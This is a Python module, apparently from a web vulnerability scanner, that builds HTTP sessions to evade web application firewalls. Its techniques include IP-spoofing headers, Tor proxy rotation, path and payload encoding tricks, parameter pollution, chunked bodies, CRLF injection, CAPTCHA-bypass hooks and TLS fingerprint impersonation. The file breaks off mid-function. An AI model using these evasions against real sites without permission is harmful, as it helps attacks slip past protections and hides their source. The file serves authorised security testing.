from __future__ import annotations
import hashlib
import random
import re
import threading
import time
import logging
import string
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Sequence, Tuple
from urllib.parse import urlparse, urlunparse

import requests
from requests.adapters import HTTPAdapter
from requests.models import PreparedRequest

logger = logging.getLogger(__name__)
_logger = logger  # alias used in merged modules

# --- Enhanced User-Agents List ---
_USER_AGENTS = [
    # Windows Chrome
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    # Windows Edge
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
    # Windows Firefox
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    # Mac Chrome
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    # Mac Safari
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    # Linux Chrome
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    # Linux Firefox
    "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    # Mobile
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.80 Mobile Safari/537.36"
]

def get_random_user_agent() -> str:
    """Returns a random modern User-Agent string."""
    return random.choice(_USER_AGENTS)

def generate_random_ip() -> str:
    """Generates a random public IP address."""
    # Avoid private ranges approx
    first = random.choice([x for x in range(1, 224) if x not in (10, 127, 169, 172, 192)])
    return f"{first}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"

def get_spoof_headers() -> Dict[str, str]:
    """Returns headers to spoof source IP."""
    ip = generate_random_ip()
    return {
        "X-Forwarded-For": ip,
        "X-Real-IP": ip,
        "X-Client-IP": ip,
        "X-Originating-IP": ip,
        "X-Remote-IP": ip,
        "X-Remote-Addr": ip,
        "Client-IP": ip,
        "True-Client-IP": ip,
        "X-Forwarded-Host": "localhost"
    }

def _randomize_header_case(header: str) -> str:
    """Randomly changes case of header characters."""
    return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in header)

def _generate_junk_header() -> tuple[str, str]:
    """Generates a random junk header."""
    key = "X-" + "".join(random.choices(string.ascii_letters, k=random.randint(4, 8)))
    val = "".join(random.choices(string.ascii_letters + string.digits, k=random.randint(4, 12)))
    return key, val

def _double_encode_path(path: str) -> str:
    """Double URL-encode each percent sign: /admin%27 -> /admin%2527"""
    import re
    return re.sub(r'%([0-9A-Fa-f]{2})', lambda m: f'%25{m.group(1)}', path)


def _unicode_encode_path(path: str) -> str:
    """Replace ASCII letters with unicode equivalents to bypass signature matching."""
    # Use unicode fullwidth variants for select chars (WAF signature confusion)
    _map = {
        'a': '\u0430', 'e': '\u0435', 'o': '\u043e',
        'p': '\u0440', 'c': '\u0441', 'x': '\u0445',
    }
    return "".join(_map.get(c, c) if random.random() < 0.3 else c for c in path)


def _case_randomize_path(path: str) -> str:
    """Randomly change ASCII letter case in URL path segments."""
    return "".join(
        c.upper() if c.isalpha() and random.random() < 0.5 else c
        for c in path
    )


class WAFBypassAdapter(HTTPAdapter):
    """
    Adapter that injects WAF bypass headers, randomizes casing,
    and performs path obfuscation + payload encoding based on bypass flags
    set by BypassStrategyEngine.
    """

    def __init__(self, session_ref=None, **kwargs):
        super().__init__(**kwargs)
        self._session_ref = session_ref

    def _get_flag(self, name: str, default=False):
        s = self._session_ref
        if s is None:
            return default
        return getattr(s, name, default)

    def send(self, request: PreparedRequest, **kwargs):
        # 0. Continuous IP rotation — swap proxy every N requests
        sess = self._session_ref
        if sess is not None and hasattr(sess, "_req_counter"):
            _lock = getattr(sess, "_counter_lock", None)
            if _lock:
                with _lock:
                    sess._req_counter += 1
                    _cur = sess._req_counter
            else:
                sess._req_counter += 1
                _cur = sess._req_counter
            rotate_every = getattr(sess, "_rotate_every", 10)
            if _cur % max(1, rotate_every) == 0:
                try:
                    from websecure.core.waf_bypass import get_tor_proxy
                    new_proxy = get_tor_proxy()
                    if new_proxy:
                        sess.proxies.update(new_proxy)
                        proxy_str = list(new_proxy.values())[0]
                        logger.debug(
                            "[WAFBypass] Continuous rotation: proxy -> %s (req#%d)",
                            proxy_str, _cur,
                        )
                        try:
                            from websecure.core.reporting import get_live_monitor
                            get_live_monitor().log_rotation(_cur, proxy_str)
                        except (ImportError, AttributeError) as exc:
                            logger.debug(f"[WAFBypass] Live monitor log_rotation failed: {exc!r}")
                except Exception as exc:
                    logger.debug(f"[WAFBypass] Proxy rotation failed: {exc!r}")

        # 1. Rotate User-Agent
        if "User-Agent" not in request.headers or "python-requests" in request.headers["User-Agent"]:
            request.headers["User-Agent"] = get_random_user_agent()

        # 2. Inject IP Spoofing Headers
        spoof_headers = get_spoof_headers()
        for k, v in spoof_headers.items():
            if k not in request.headers:
                request.headers[k] = v

        # Extra Bypass Headers (Cloudflare, IIS, Nginx overrides)
        request.headers["X-Rewrite-URL"] = request.path_url
        request.headers["X-Original-URL"] = request.path_url
        request.headers["X-Forwarded-Scheme"] = "https"
        request.headers["X-Forwarded-Proto"] = "https"

        # 3. Path Mutations — applied based on active bypass flags
        try:
            parsed = urlparse(request.url)
            path = parsed.path or "/"

            # 3a. Double URL encoding (e.g. %27 -> %2527)
            if self._get_flag("_bypass_double_encode"):
                path = _double_encode_path(path)

            # 3b. Unicode char substitution
            elif self._get_flag("_bypass_unicode"):
                path = _unicode_encode_path(path)

            # 3c. Case randomization for case-insensitive WAF rules
            elif self._get_flag("_bypass_case"):
                path = _case_randomize_path(path)

            # 3d. Structural obfuscation — round-robin through all tactics
            elif random.random() < 0.2 and path.startswith("/"):
                _ALL_TACTICS = ["double_slash", "current_dir", "semicolon", "null_byte_ext"]
                sess = self._session_ref
                if sess is not None:
                    tried = getattr(sess, "_path_tactics_tried", set())
                    untried = [t for t in _ALL_TACTICS if t not in tried]
                    tactic = untried[0] if untried else random.choice(_ALL_TACTICS)
                    tried.add(tactic)
                    sess._path_tactics_tried = tried
                else:
                    tactic = random.choice(_ALL_TACTICS)
                if tactic == "double_slash":
                    path = "//" + path.lstrip("/")
                elif tactic == "current_dir":
                    path = "/./" + path.lstrip("/")
                elif tactic == "semicolon":
                    path = path + ";.css"
                elif tactic == "null_byte_ext":
                    path = path + "%00.html"

            # 3e. PathMutator structural obfuscation (_evasion_path_mutate flag)
            if self._get_flag("_evasion_path_mutate") and path.startswith("/"):
                try:
                    from websecure.core.evasion import PathMutator as _PM
                    _pm_variants = _PM().mutate(path)
                    if _pm_variants:
                        path = random.choice(_pm_variants)
                except (ImportError, Exception) as exc:
                    logger.debug(f"[WAFBypass] PathMutator failed: {exc!r}")

            # Apply suffix if set (e.g. from random_path_suffix strategy)
            suffix = getattr(self._session_ref, "_bypass_path_suffix", None) if self._session_ref else None
            if suffix and not path.endswith(suffix):
                path = path.rstrip("/") + suffix

            request.url = urlunparse((
                parsed.scheme, parsed.netloc, path,
                parsed.params, parsed.query, parsed.fragment
            ))
        except (ValueError, AttributeError) as exc:
            logger.debug(f"[WAFBypass] Path mutation failed: {exc!r}")

        # 4. Header Modification (Junk)
        if random.random() < 0.3:
            junk_k, junk_v = _generate_junk_header()
            request.headers[junk_k] = junk_v

        # 5. Browser noise headers
        if "Accept-Language" not in request.headers:
            request.headers["Accept-Language"] = random.choice([
                "en-US,en;q=0.9", "tr-TR,tr;q=0.9,en;q=0.8",
                "en-GB,en;q=0.8", "de-DE,de;q=0.9,en;q=0.7",
            ])
        if "DNT" not in request.headers:
            request.headers["DNT"] = "1"
        if "Upgrade-Insecure-Requests" not in request.headers:
            request.headers["Upgrade-Insecure-Requests"] = "1"
        if "Sec-Fetch-Site" not in request.headers:
            request.headers["Sec-Fetch-Site"] = "none"
        if "Sec-Fetch-Mode" not in request.headers:
            request.headers["Sec-Fetch-Mode"] = "navigate"
        if "Sec-Fetch-User" not in request.headers:
            request.headers["Sec-Fetch-User"] = "?1"

        # 6. HPP — duplicate a real parameter to confuse WAF parsers
        if self._get_flag("_bypass_hpp") or random.random() < 0.15:
            try:
                parsed2 = urlparse(request.url)
                if parsed2.query:
                    first_pair = parsed2.query.split("&")[0]
                    request.url = request.url + "&" + first_pair
                else:
                    junk_param = f"_={random.randint(1000, 9999)}"
                    request.url += "?" + junk_param
            except (ValueError, AttributeError) as exc:
                logger.debug(f"[WAFBypass] HPP mutation failed: {exc!r}")

        # 7. Chunked body encoding (_evasion_chunked flag)
        if self._get_flag("_evasion_chunked") and request.body:
            try:
                from websecure.core.evasion import ChunkedBodyBuilder
                body = (
                    request.body
                    if isinstance(request.body, bytes)
                    else str(request.body).encode("utf-8")
                )
                min_c = getattr(self._session_ref, "_chunk_min", 1) if self._session_ref else 1
                max_c = getattr(self._session_ref, "_chunk_max", 6) if self._session_ref else 6
                request.body = ChunkedBodyBuilder().build(body, min_chunk=min_c, max_chunk=max_c)
                request.headers.pop("Content-Length", None)
                request.headers["Transfer-Encoding"] = "chunked"
            except (ImportError, AttributeError, TypeError) as exc:
                logger.debug(f"[WAFBypass] Chunked encoding failed: {exc!r}")

        # 8. JSON unicode escape (_evasion_json_escape flag)
        if self._get_flag("_evasion_json_escape") and request.body:
            try:
                ct = request.headers.get("Content-Type", "")
                if "json" in ct.lower():
                    from websecure.core.evasion import JSONUnicodeEscaper
                    body_s = (
                        request.body
                        if isinstance(request.body, str)
                        else request.body.decode("utf-8", "replace")
                    )
                    request.body = JSONUnicodeEscaper().escape_json(body_s).encode("utf-8")
                    if "Content-Length" in request.headers:
                        request.headers["Content-Length"] = str(len(request.body))
            except (ImportError, AttributeError, UnicodeDecodeError) as exc:
                logger.debug(f"[WAFBypass] JSON unicode escape failed: {exc!r}")

        # 9. Overlong UTF-8 path encoding (_evasion_overlong flag)
        if self._get_flag("_evasion_overlong"):
            try:
                from websecure.core.evasion import OverlongUTF8Encoder
                from urllib.parse import urlsplit, urlunsplit
                parts    = urlsplit(request.url)
                new_path = OverlongUTF8Encoder().partial_encode(parts.path, "/<>\"'()")
                request.url = urlunsplit(parts._replace(path=new_path))
            except (ImportError, AttributeError, ValueError) as exc:
                logger.debug(f"[WAFBypass] Overlong UTF-8 encoding failed: {exc!r}")

        # 10. Parameter fragmentation (_evasion_param_frag flag)
        if self._get_flag("_evasion_param_frag"):
            try:
                from websecure.core.evasion import ParamFragmentor
                from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode
                parts = urlsplit(request.url)
                if parts.query:
                    params    = parse_qsl(parts.query, keep_blank_values=True)
                    fragmentor = ParamFragmentor()
                    new_params: list = []
                    for k, v in params:
                        if len(v) > 4:
                            new_params.extend(fragmentor.fragment(k, v, n=2))
                        else:
                            new_params.append((k, v))
                    request.url = urlunsplit(parts._replace(query=urlencode(new_params)))
            except (ImportError, AttributeError, ValueError) as exc:
                logger.debug(f"[WAFBypass] Param fragmentation failed: {exc!r}")

        # 11. CRLF / newline injection in query string (_evasion_newline flag)
        if self._get_flag("_evasion_newline"):
            try:
                from websecure.core.evasion import CRLFInjector
                from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode
                parts  = urlsplit(request.url)
                if parts.query:
                    params = parse_qsl(parts.query, keep_blank_values=True)
                    if params:
                        k, v   = params[0]
                        # Inject a benign newline-encoded string to probe WAF parsing
                        params[0] = (k, v + CRLFInjector.CRLF_SEQS[0] + "X-Waf-Test: 1")
                        request.url = urlunsplit(parts._replace(query=urlencode(params)))
            except (ImportError, AttributeError, ValueError) as exc:
                logger.debug(f"[WAFBypass] CRLF injection failed: {exc!r}")

        # 12. EncodingChain — multi-layer payload encoding (_evasion_encoding_chain flag)
        if self._get_flag("_evasion_encoding_chain") and request.body:
            try:
                from websecure.core.evasion import EncodingChain
                body_s = (
                    request.body if isinstance(request.body, str)
                    else request.body.decode("utf-8", "replace")
                )
                techniques = getattr(self._session_ref, "_evasion_chain_techniques", ["url", "html"])
                request.body = EncodingChain().apply(body_s, techniques).encode("utf-8")
                if "Content-Length" in request.headers:
                    request.headers["Content-Length"] = str(len(request.body))
            except (ImportError, AttributeError, UnicodeDecodeError) as exc:
                logger.debug(f"[WAFBypass] EncodingChain failed: {exc!r}")

        # 13. HTTP/2 pseudo-header reordering (_evasion_http2_pseudo flag)
        if self._get_flag("_evasion_http2_pseudo"):
            try:
                from websecure.core.evasion import HTTP2EvasionHelper
                _h2 = HTTP2EvasionHelper()
                parsed_h2 = urlparse(request.url)
                h2_headers = _h2.build_http2_headers(
                    method=request.method or "GET",
                    path=parsed_h2.path or "/",
                    authority=parsed_h2.netloc or "",
                    randomize_order=True,
                )
                # Store on session so curl_cffi / httpx drivers can consume them
                if self._session_ref is not None:
                    self._session_ref._h2_pseudo_headers = h2_headers
                    # Inject non-pseudo headers into the request
                    for k, v in h2_headers:
                        if not k.startswith(":") and k.lower() not in (
                            hk.lower() for hk in request.headers
                        ):
                            request.headers[k] = v
            except (ImportError, AttributeError, ValueError) as exc:
                logger.debug(f"[WAFBypass] HTTP2EvasionHelper failed: {exc!r}")

        return super().send(request, **kwargs)

class WAFBypassSession(requests.Session):
    """
    A requests.Session subclass that automatically uses WAFBypassAdapter
    and adds random jitter/delay to requests.
    Bypass strategy flags (_bypass_double_encode, _bypass_unicode, etc.)
    are set by BypassStrategyEngine and read by WAFBypassAdapter at send time.

    Continuous IP rotation: proxy is rotated every _rotate_every requests
    (default 10) so the source IP changes throughout the entire scan, not
    only after a ban is detected.
    """
    def __init__(
        self,
        jitter_range: tuple[float, float] = (0.5, 2.0),
        rotate_every: int = 10,
    ):
        super().__init__()
        self.jitter_range   = jitter_range
        self._rotate_every  = rotate_every   # rotate proxy after this many requests
        self._req_counter   = 0              # incremented by WAFBypassAdapter.send()
        self._counter_lock  = __import__("threading").Lock()
        # Pass self so adapter can read bypass flags from this session
        adapter = WAFBypassAdapter(session_ref=self)
        self.mount("https://", adapter)
        self.mount("http://", adapter)
        self.headers.update({
            "User-Agent": get_random_user_agent(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive"
        })

    def request(self, method, url, *args, **kwargs):
        # Jitter is applied at scan-phase level (between scanner invocations),
        # NOT on every individual HTTP request.  Per-request sleep turns
        # concurrency=20 into ~20 s/round and makes aggressive mode impractical.
        # Callers that genuinely need stealth pacing should call
        # WAFBypassSession.phase_sleep() once per scan phase, not here.
        resp = super().request(method, url, *args, **kwargs)
        # Feedback loop: track 403/429 and learn which bypass strategies are failing
        if resp is not None:
            self._record_response_code(resp.status_code)
        return resp

    def _record_response_code(self, status_code: int) -> None:
        """
        Track WAF block signals (403, 406, 429, 503) vs successes (2xx/3xx).
        Used by get_bypass_effectiveness() to measure which strategies work.
        """
        import threading as _threading
        if not hasattr(self, "_response_stats"):
            self._response_stats: dict = {"blocked": 0, "allowed": 0, "total": 0}
            self._stats_lock = _threading.Lock()
        with self._stats_lock:
            self._response_stats["total"] += 1
            if status_code in (403, 406, 429, 503):
                self._response_stats["blocked"] += 1
            elif status_code < 400:
                self._response_stats["allowed"] += 1

    def get_bypass_effectiveness(self) -> dict:
        """
        Return a dict with block_rate, allow_rate and applied strategies.
        Callers can use this to decide whether to switch bypass strategy.
        """
        stats = getattr(self, "_response_stats", {"blocked": 0, "allowed": 0, "total": 0})
        total = max(stats["total"], 1)
        return {
            "total_requests":   stats["total"],
            "blocked":          stats["blocked"],
            "allowed":          stats["allowed"],
            "block_rate":       round(stats["blocked"] / total, 3),
            "allow_rate":       round(stats["allowed"] / total, 3),
            "applied_strategies": getattr(self, "_applied_strategies", []),
        }

    def phase_sleep(self) -> None:
        """
        Call this ONCE between scanner phases (not between individual requests)
        when stealth pacing is desired.  Respects self.jitter_range if set.
        """
        if self.jitter_range:
            sleep_time = random.uniform(*self.jitter_range)
            logger.debug(f"[WAF] Phase jitter sleep: {sleep_time:.2f}s")
            time.sleep(sleep_time)


# ============================================================================
# BYPASS STRATEGY ENGINE
# Applies detected WAF's recommended bypass strategies to requests
# ============================================================================
import urllib.parse as _urlparse

class BypassStrategyEngine:
    """
    Applies WAF-specific bypass strategies to a requests.Session.
    Called after WAFDetector identifies the vendor and its bypass_strategies list.
    """

    _STRATEGIES = {}

    @classmethod
    def register(cls, name):
        def decorator(fn):
            cls._STRATEGIES[name] = fn
            return fn
        return decorator

    def apply(self, session: "WAFBypassSession", strategies: list) -> "WAFBypassSession":
        """Apply all listed strategies to the session. Tracks applied/failed for diagnostics."""
        applied: List[str] = []
        failed: List[str] = []
        for name in strategies:
            fn = self._STRATEGIES.get(name)
            if not fn:
                failed.append(f"unknown:{name}")
                logger.debug(f"[BypassEngine] Unknown strategy: '{name}'")
                continue
            try:
                fn(session)
                applied.append(name)
            except Exception as e:
                failed.append(f"{name}:{e}")
                logger.warning(f"[BypassEngine] Strategy '{name}' failed: {e}")
        session._applied_strategies = applied
        session._failed_strategies = failed
        if applied:
            logger.debug(f"[BypassEngine] Applied: {applied}")
        if failed:
            logger.info(f"[BypassEngine] Failed/unknown: {failed}")
        return session


_engine = BypassStrategyEngine()


@BypassStrategyEngine.register("chunked_encoding")
def _s_chunked(session):
    """Chunked body encoding — body is split across variable-size chunks at send time."""
    session._evasion_chunked = True
    session._chunk_min       = 3
    session._chunk_max       = 12
    # Transfer-Encoding header is set by WAFBypassAdapter.send() after building the body


@BypassStrategyEngine.register("content_type_mismatch")
def _s_ct_mismatch(session):
    session.headers["Content-Type"] = "application/x-www-form-urlencoded; charset=ibm037"


@BypassStrategyEngine.register("xff_internal_cidr")
def _s_xff(session):
    session.headers["X-Forwarded-For"] = "127.0.0.1"
    session.headers["X-Real-IP"] = "10.0.0.1"


@BypassStrategyEngine.register("unicode_normalization")
def _s_unicode(session):
    """Unicode normalization bypass — encode reserved chars as unicode escapes."""
    session._bypass_unicode = True
    # Also set Content-Type with charset hint
    if "Content-Type" not in session.headers:
        session.headers["Content-Type"] = "application/x-www-form-urlencoded; charset=utf-8"


@BypassStrategyEngine.register("double_url_encoding")
def _s_double_enc(session):
    """Double URL encoding — marks session so WAFBypassAdapter applies %25xx encoding."""
    session._bypass_double_encode = True


@BypassStrategyEngine.register("case_sensitivity_bypass")
def _s_case(session):
    """Path case randomization for case-insensitive WAF rules."""
    session._bypass_case = True


@BypassStrategyEngine.register("hpp_duplicate_params")
def _s_hpp(session):
    """HTTP Parameter Pollution — duplicate key=val pairs to confuse WAF parsers."""
    session._bypass_hpp = True


@BypassStrategyEngine.register("json_unicode_escape")
def _s_json_esc(session):
    """Unicode-escape JSON string values so WAF keyword patterns miss 'select', 'union', etc."""
    session._evasion_json_escape = True
    session.headers["Content-Type"] = "application/json; charset=utf-8"


@BypassStrategyEngine.register("accept_header_rotation")
def _s_accept(session):
    session.headers["Accept"] = random.choice([
        "application/json",
        "text/html,application/xhtml+xml",
        "*/*",
        "application/xml,text/xml",
    ])


@BypassStrategyEngine.register("referrer_spoofing")
def _s_referer(session):
    session.headers["Referer"] = "https://www.google.com/search?q=site"


@BypassStrategyEngine.register("tls_fingerprint_chrome")
def _s_tls(session):
    """
    TLS parmak izi sahteciliği.

    curl_cffi mevcutsa: HttpClient sürücüsünü curl_cffi'ye geçmek için
    bayrak koyar. curl_cffi yoksa tls-client'a, o da yoksa sessizce geçer.
    """
    # 1. curl_cffi — en iyi JA3/JA4 taklidi (_CURL_CFFI_AVAILABLE ve _resolve_profile bu modülde tanımlı)
    try:
        if _CURL_CFFI_AVAILABLE:
            session._use_curl_cffi = True
            session._curl_cffi_profile = _resolve_profile("chrome_124")
            return
    except (ImportError, AttributeError) as exc:
        logger.debug(f"[WAFBypass] TLS fingerprint (curl_cffi) setup failed: {exc!r}")

    # 2. tls-client fallback
    try:
        import tls_client as _tc
        tls_sess = _tc.Session(client_identifier="chrome_120")
        tls_sess.headers.update(dict(session.headers))
        session._tls_client = tls_sess
    except ImportError:
        pass


@BypassStrategyEngine.register("random_path_suffix")
def _s_path(session):
    session._bypass_path_suffix = f";.{random.choice(['css','js','png','gif'])}"


@BypassStrategyEngine.register("header_injection_variants")
def _s_header_variants(session):
    session.headers["X-Forwarded-Host"] = "localhost"
    session.headers["X-Host"] = "127.0.0.1"


@BypassStrategyEngine.register("param_fragmentation")
def _s_param_frag(session):
    """Split query-string parameter values across duplicate keys to confuse WAF parsers."""
    session._evasion_param_frag = True


@BypassStrategyEngine.register("captcha_bypass")
def _s_captcha_bypass(session):
    """
    Activates the CaptchaBypassMiddleware on this session.

    The middleware is already wired globally through http.install_captcha_config().
    This strategy marks the session so that per-session CAPTCHA solving is
    enabled when a challenge is encountered during scanning.
    """
    session._captcha_bypass_enabled = True


@BypassStrategyEngine.register("overlong_utf8")
def _s_overlong(session):
    """Overlong UTF-8 path encoding — encodes special chars as non-canonical multi-byte sequences."""
    session._evasion_overlong = True


@BypassStrategyEngine.register("chunked_small_chunks")
def _s_chunked_small(session):
    """Extreme 1-byte chunk encoding — maximum pattern-matching confusion."""
    session._evasion_chunked = True
    session._chunk_min       = 1
    session._chunk_max       = 2


@BypassStrategyEngine.register("newline_injection")
def _s_newline(session):
    """CRLF/newline injection into query parameters to probe WAF header-parsing."""
    session._evasion_newline = True


@BypassStrategyEngine.register("path_parameter_pollution")
def _s_path_param_poll(session):
    """
    Combine path obfuscation + parameter fragmentation to confuse WAF
    path-normalisation and parameter-inspection in a single request.
    """
    session._evasion_param_frag = True
    session._bypass_path_suffix = f";{random.choice(['v1','api','ext','cache'])}=1"


@BypassStrategyEngine.register("http2_pseudo_header_order")
def _s_http2_pseudo(session):
    """
    HTTP/2 pseudo-header reordering.
    Uses HTTP2EvasionHelper to build randomised pseudo-header order.
    Sets a flag so WAFBypassAdapter applies it in send().
    """
    session._evasion_http2_pseudo = True
    # If curl_cffi is available, prefer it as it exposes header-order control
    try:
        if _CURL_CFFI_AVAILABLE:
            session._use_curl_cffi     = True
            session._curl_cffi_profile = _resolve_profile("chrome_124")
    except (ImportError, AttributeError) as exc:
        logger.debug(f"[WAFBypass] HTTP/2 pseudo-header curl_cffi setup failed: {exc!r}")


@BypassStrategyEngine.register("path_mutator")
def _s_path_mutator(session):
    """
    PathMutator structural obfuscation — generates dot-segment, semicolon,
    double-slash and Unicode variants of the request path to bypass WAF
    path-normalisation rules.
    """
    session._evasion_path_mutate = True


@BypassStrategyEngine.register("encoding_chain")
def _s_encoding_chain(session):
    """
    EncodingChain multi-layer payload encoding — applies URL + HTML encoding
    layers to the request body to evade WAF signature matching.
    """
    session._evasion_encoding_chain = True
    session._evasion_chain_techniques = ["url", "html"]


_DEFAULT_BYPASS_STRATEGIES = [
    "xff_internal_cidr",
    "chunked_encoding",
    "double_url_encoding",
    "random_path_suffix",
    "path_mutator",
    "encoding_chain",
    "http2_pseudo_header_order",
]

def build_bypass_session(waf_profile=None) -> WAFBypassSession:
    """
    Build a WAFBypassSession with strategies applied for the detected WAF.
    If no WAF is detected, applies a default set of generic evasion strategies
    to maximise bypass chances against unknown protection.
    """
    session = WAFBypassSession()
    if waf_profile and getattr(waf_profile, "detected", False):
        strategies = waf_profile.bypass_strategies or []
        _engine.apply(session, strategies)
        logger.info(
            f"[BypassEngine] Vendor '{waf_profile.vendor}': "
            f"{len(strategies)} strategies applied"
        )
    else:
        # Unknown/undetected WAF — apply safe generic strategies
        _engine.apply(session, _DEFAULT_BYPASS_STRATEGIES)
        logger.info(
            f"[BypassEngine] No WAF detected — applied {len(_DEFAULT_BYPASS_STRATEGIES)} "
            "default generic strategies"
        )
    return session


# ===========================================================================
# MERGED FROM: websecure/core/tls_driver.py
# curl_cffi tabanlı JA3/JA4 TLS parmak izi taklidi
# ===========================================================================

# ---------------------------------------------------------------------------
# Opsiyonel import — curl_cffi kurulu değilse sessizce degrade edilir
# ---------------------------------------------------------------------------
try:
    from curl_cffi import requests as _cffi_requests
    from curl_cffi.requests import Session as _CffiSession
    _CURL_CFFI_AVAILABLE = True
    _logger.debug("[TLSDriver] curl_cffi mevcut — tarayıcı TLS taklidi aktif.")
except ImportError:
    _cffi_requests = None  # type: ignore
    _CffiSession = None    # type: ignore
    _CURL_CFFI_AVAILABLE = False
    _logger.debug("[TLSDriver] curl_cffi bulunamadı — subprocess curl fallback kullanılacak.")


# ---------------------------------------------------------------------------
# Profil Haritası  (websecure profil adı -> curl_cffi impersonate değeri)
# ---------------------------------------------------------------------------
CFFI_PROFILE_MAP: Dict[str, str] = {
    # Chrome
    "chrome_120":  "chrome120",
    "chrome_122":  "chrome122",
    "chrome_124":  "chrome124",
    "chrome_131":  "chrome131",
    # Firefox
    "firefox_115": "firefox115",
    "firefox_120": "ff120",
    "firefox_133": "firefox133",
    # Safari macOS
    "safari_17":   "safari17_0",
    "safari_18":   "safari18_0",
    # Safari iOS
    "safari_ios":  "safari_ios17_2",
    "safari_ios18":"safari_ios18_1_1",
    # Edge
    "edge_122":    "edge122",
    "edge_131":    "edge131",
}

DEFAULT_PROFILE = "chrome124"


def _resolve_profile(profile: str) -> str:
    """İç profil adını curl_cffi impersonate string'ine çevirir."""
    return CFFI_PROFILE_MAP.get(profile, profile or DEFAULT_PROFILE)


# ---------------------------------------------------------------------------
# Hafif yanıt sarmalayıcısı — requests.Response ile aynı arayüz
# ---------------------------------------------------------------------------
class CffiResponse:
    """curl_cffi yanıtını websecure UnifiedResponse ile uyumlu hale getirir."""

    def __init__(self, raw) -> None:
        self._raw = raw

    @property
    def status_code(self) -> int:
        return getattr(self._raw, "status_code", 0)

    @property
    def headers(self) -> Dict[str, str]:
        h = getattr(self._raw, "headers", {})
        return dict(h) if h else {}

    @property
    def text(self) -> str:
        try:
            return self._raw.text
        except (AttributeError, UnicodeDecodeError) as exc:
            logger.debug(f"[WAFBypass] CffiResponse.text decode failed: {exc!r}")
            return ""

    @property
    def content(self) -> bytes:
        return getattr(self._raw, "content", b"")

    @property
    def url(self) -> str:
        return str(getattr(self._raw, "url", ""))

    @property
    def ok(self) -> bool:
        return 200 <= self.status_code < 400

    @property
    def reason(self) -> str:
        return getattr(self._raw, "reason", "")

    def json(self, **kwargs):
        return self._raw.json(**kwargs)

    def raise_for_status(self):
        return self._raw.raise_for_status()


# ---------------------------------------------------------------------------
# Ana sürücü sınıfı
# ---------------------------------------------------------------------------
@dataclass
class CurlCffiDriver:
    """
    curl_cffi tabanlı HTTP sürücüsü.

    Gerçek tarayıcı JA3/JA4 TLS parmak izi + HTTP/2 başlık sıralaması
    ile istek gönderir. requests.Session ile birebir uyumlu arayüz sunar.

    Kullanım::

        driver = CurlCffiDriver(profile="chrome_124")
        resp = driver.request_once("GET", "https://hedef.com/")
    """

    profile: str = "chrome_124"
    proxy_url: Optional[str] = None
    verify: bool = True
    timeout_pair: tuple[float, float] = (10.0, 30.0)
    extra_headers: Dict[str, str] = field(default_factory=dict)

    # Dahili oturum — yeniden kullanılır
    _session: Any = field(init=False, default=None, repr=False)

    def __post_init__(self) -> None:
        if not _CURL_CFFI_AVAILABLE:
            raise RuntimeError(
                "curl_cffi kurulu değil. "
                "Kurulum: pip install 'websecure-scanner[bypass]' veya pip install curl-cffi"
            )
        impersonate = _resolve_profile(self.profile)
        proxies = {"https": self.proxy_url, "http": self.proxy_url} if self.proxy_url else None

        self._session = _CffiSession(
            impersonate=impersonate,
            verify=self.verify,
            proxies=proxies,
        )
        if self.extra_headers:
            self._session.headers.update(self.extra_headers)
        _logger.debug(f"[TLSDriver] Oturum oluşturuldu: impersonate={impersonate}, proxy={self.proxy_url}")

    # ------------------------------------------------------------------
    def update_proxy(self, proxy_url: Optional[str]) -> None:
        """Proxy URL'yi çalışma zamanında değiştirir."""
        self.proxy_url = proxy_url
        if self._session is not None:
            proxies = {"https": proxy_url, "http": proxy_url} if proxy_url else {}
            self._session.proxies = proxies

    def update_profile(self, profile: str) -> None:
        """TLS profilini değiştirir — yeni oturum oluşturur."""
        self.profile = profile
        old_headers = dict(self._session.headers) if self._session else {}
        impersonate = _resolve_profile(profile)
        proxies = {"https": self.proxy_url, "http": self.proxy_url} if self.proxy_url else None
        self._session = _CffiSession(
            impersonate=impersonate,
            verify=self.verify,
            proxies=proxies,
        )
        self._session.headers.update(old_headers)
        _logger.debug(f"[TLSDriver] Profil güncellendi: {impersonate}")

    # ------------------------------------------------------------------
    def request_once(self, method: str, url: str, **kw) -> CffiResponse:
        """
        Tek bir HTTP isteği gönderir.

        kw parametreleri requests.Session.request ile aynıdır:
        headers, params, data, json, files, cookies, allow_redirects, timeout
        """
        if self._session is None:
            raise RuntimeError("CurlCffiDriver başlatılmamış.")

        # Zaman aşımı
        kw.setdefault("timeout", int(self.timeout_pair[1]))

        # Doğrulama — curl_cffi verify parametresini kabul eder
        kw.setdefault("verify", self.verify)

        # Başlıkları birleştir
